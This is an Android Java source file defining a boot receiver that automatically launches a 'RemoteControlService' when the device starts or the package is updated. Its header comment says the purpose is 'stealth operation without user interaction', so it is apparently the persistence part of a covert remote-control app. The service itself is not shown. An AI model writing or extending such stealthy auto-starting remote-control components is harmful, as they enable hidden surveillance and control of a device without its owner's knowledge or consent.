package com.example.myapplication555.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import com.example.myapplication555.service.RemoteControlService;

/**
 * Boot Receiver - Automatically starts remote control service on device boot
 * Enables stealth operation without user interaction
 */
public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "BootReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction()) || 
            Intent.ACTION_MY_PACKAGE_REPLACED.equals(intent.getAction()) ||
            Intent.ACTION_PACKAGE_REPLACED.equals(intent.getAction())) {
            
            Log.i(TAG, "Boot completed - starting remote control service");
            
            try {
                // Start the remote control service automatically
                Intent serviceIntent = new Intent(context, RemoteControlService.class);
                serviceIntent.putExtra("auto_start", true);
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(serviceIntent);
                } else {
                    context.startService(serviceIntent);
                }
                
                Log.i(TAG, "Remote control service started automatically on boot");
                
            } catch (Exception e) {
                Log.e(TAG, "Failed to start remote control service on boot", e);
            }
        }
    }
} 